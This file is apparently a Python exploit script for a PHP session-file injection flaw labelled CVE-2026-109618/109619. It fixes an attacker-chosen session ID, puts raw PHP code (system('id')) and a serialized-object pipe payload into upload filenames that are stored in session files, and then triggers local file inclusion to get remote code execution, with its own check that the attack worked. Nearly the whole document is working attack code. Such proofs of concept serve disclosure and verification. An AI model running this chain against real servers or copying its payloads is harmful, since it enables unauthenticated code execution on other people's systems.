#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session file injection via upload_progress filename.

Demonstrates:
  1. Session fixation via Cookie PHPSESSID (attacker-chosen SID is honoured)
  2. Unvalidated filename stored raw in session file (can contain PHP code)
  3. LFI over the session file → RCE (self-verifying step 4)

Usage:
  python3 verify_session_injection.py --target http://127.0.0.1:18080

Notes (verified on PHP 8.2.34 against a live lab):
  - The SID must travel in the Cookie header. The multipart form field
    PHPSESSID is NOT honoured in this configuration (use_only_cookies is
    effectively on for the early rfc1867 init) — the progress write then
    lands on a random SID and no file with the attacker's SID is created.
  - session.upload_progress.enabled defaults to On and needs no
    session_start() — the file is created before the script runs.
  - The read step requires an LFI sink (lab ships /vuln.php?page=...).

For authorized security testing only.
"""
import argparse
import socket
from urllib.parse import urlparse


def send_upload(host, port, path, sid, filename):
    boundary = "VERIFY"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return _send(host, port, req)


def http_get(host, port, path):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return _send(host, port, req)


def _send(host, port, req):
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--path", default="/index.php", help="Upload endpoint (any PHP)")
    ap.add_argument("--lfi", default="/vuln.php?page=", help="LFI sink prefix")
    ap.add_argument("--sid", default="verifysession00000000000000")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618/109619 — Session Injection Verification")
    print(f"[*] Target: {args.target}")
    print()

    # Test 1: Normal filename
    print("[1] Testing normal filename...")
    send_upload(host, port, args.path, args.sid + "a", "normal.txt")
    print(f"    → Session file sess_{args.sid}a should contain: s:10:\"normal.txt\"")

    # Test 2: PHP code in filename
    php_payload = "<?php system('id');echo 'RCE';?>"
    print(f"[2] Testing PHP code in filename: {php_payload}")
    send_upload(host, port, args.path, args.sid + "b", php_payload)
    print("    → Session file sess_%sb should contain the PHP code as a raw string" % args.sid)

    # Test 3: Pipe character in filename (for handler mismatch, see the
    # verify_handler_mismatch.py PoC for the full chain)
    pipe_payload = 'x|O:8:"stdClass":0:{}'
    print("[3] Testing pipe + serialized object in filename")
    escaped = pipe_payload.replace('"', '\\"')
    send_upload(host, port, args.path, args.sid + "c", escaped)
    print(f"    → Session file sess_{args.sid}c should contain |O:8: in the filename field")

    # Test 4: Self-verifying LFI → RCE (step 2's payload is PHP code)
    print("\n[4] Triggering LFI on the injected session file (self-verifying)")
    lfi_url = args.lfi + "/tmp/sessions/sess_" + args.sid + "b"
    resp = http_get(host, port, lfi_url)
    if b"uid=" in resp and b"www-data" in resp:
        print(f"    ✅ RCE CONFIRMED — command output in response: {lfi_url}")
        for line in resp.split(b"\r\n"):
            if b"uid=" in line:
                print(f"    {line.decode('latin1', 'replace').strip()}")
    elif b"<?php" in resp or b"system" in resp:
        print("    ⚠️  Session file content returned but NOT executed — "
              "LFI sink includes without executing (check the sink)")
    else:
        print("    ❌ No session content in LFI response — check that "
              "/vuln.php exists and the SID file was created")

    print()
    print("[*] Manual verification (if the target has no LFI sink):")
    print(f"    cat /tmp/sessions/sess_{args.sid}a")
    print(f"    cat /tmp/sessions/sess_{args.sid}b")
    print(f"    cat /tmp/sessions/sess_{args.sid}c")
    print()
    print("[*] Key indicators:")
    print("    - Session fixation: file created with attacker-controlled SID")
    print("    - Filename injection: raw PHP code / serialized objects in session data")
    print("    - No authentication required")


if __name__ == "__main__":
    main()
